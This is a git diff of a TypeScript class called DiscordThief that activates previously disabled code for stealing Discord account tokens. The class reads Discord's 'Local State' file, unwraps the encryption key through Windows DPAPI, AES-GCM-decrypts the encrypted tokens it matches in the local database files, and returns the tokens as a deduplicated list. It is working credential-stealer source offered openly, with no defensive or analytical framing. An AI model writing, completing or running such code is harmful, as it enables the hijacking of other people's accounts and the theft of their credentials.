@@ -1,5 +1,7 @@
 import fsPromises from 'fs/promises'
 import path from 'path'
+import win32crypt from 'win32crypt'
+import crypto, { Word32Array } from 'jscrypto'
 
 import { getDiscordPath } from './utils'
 import { ENCRYPTED_REGEX, UNENCRYPTED_REGEX } from './const'
@@ -8,7 +10,7 @@ export class DiscordThief {
     public readonly discordPath = getDiscordPath()
 
     public async getTokens() {
-        // const encryptionKey = await this.getEncryptionKey()
+        const encryptionKey = await this.getEncryptionKey()
 
         const tokens: string[] = []
         const encryptedTokens: string[] = []
@@ -17,13 +19,12 @@ export class DiscordThief {
         const dbFileNames = await fsPromises.readdir(dbPath)
 
         for (const fileName of dbFileNames) {
+            let filePath: string
             let data: string
 
             try {
-                data = await fsPromises.readFile(
-                    path.join(dbPath, fileName),
-                    'utf-8'
-                )
+                filePath = path.join(dbPath, fileName)
+                data = await fsPromises.readFile(filePath, 'utf-8')
             } catch {
                 continue
             }
@@ -31,37 +32,74 @@ export class DiscordThief {
             for (const regex of UNENCRYPTED_REGEX) {
                 const matches = data.match(regex)
 
-                if (!matches) {
-                    continue
+                if (matches) {
+                    tokens.push(matches[0])
                 }
-
-                tokens.push(matches[0])
             }
 
             for (const regex of ENCRYPTED_REGEX) {
                 const matches = data.match(regex)
 
-                if (!matches) {
-                    continue
+                if (matches) {
+                    encryptedTokens.push(matches[0])
                 }
-
-                encryptedTokens.push(matches[0])
             }
 
-            // for (const encryptedToken of encryptedTokens) {
-            //     const token = await this.decryptToken(
-            //         b64Decode(encryptedToken.split('dQw4w9WgXcQ:')[1]),
-            //         encryptionKey
-            //     )
+            for (const encryptedToken of encryptedTokens) {
+                let token = await this.decryptToken(
+                    encryptedToken,
+                    encryptionKey
+                )
 
-            //     if (!token) {
-            //         continue
-            //     }
+                if (token.endsWith('\\')) {
+                    token = token.replace('\\', '')
+                }
 
-            //     tokens.push(token)
-            // }
+                if (token) {
+                    tokens.push(token)
+                }
+            }
         }
 
-        return tokens
+        const uniqueTokens = [...new Set(tokens)]
+
+        return uniqueTokens
+    }
+
+    public async decryptToken(token: string, key: Uint8Array) {
+        const tokenData = token.split('dQw4w9WgXcQ:')[1]
+        const tokenBuffer = Buffer.from(tokenData, 'base64')
+
+        const decryptedBuffer = crypto.AES.decrypt(
+            new crypto.CipherParams({
+                cipherText: new Word32Array(tokenBuffer.subarray(15))
+            }),
+            new Word32Array(key),
+            {
+                iv: new Word32Array(tokenBuffer.subarray(3, 15)),
+                mode: crypto.mode.GCM,
+                padding: crypto.pad.NoPadding
+            }
+        )
+
+        const hex = decryptedBuffer.toString().slice(0, -16)
+        const decoded = Buffer.from(hex, 'hex').toString().split('�')[0]
+
+        return decoded
+    }
+
+    public async getEncryptionKey() {
+        const statePath = path.join(this.discordPath, 'Local State')
+        const stateFileData = await fsPromises.readFile(statePath, 'utf-8')
+        const state = JSON.parse(stateFileData)
+
+        const encryptedKey = state.os_crypt.encrypted_key
+        const decryptedKey = win32crypt.unprotectData(
+            Buffer.from(encryptedKey, 'base64').subarray(5),
+            null,
+            'CurrentUser'
+        )
+
+        return decryptedKey
     }
 }
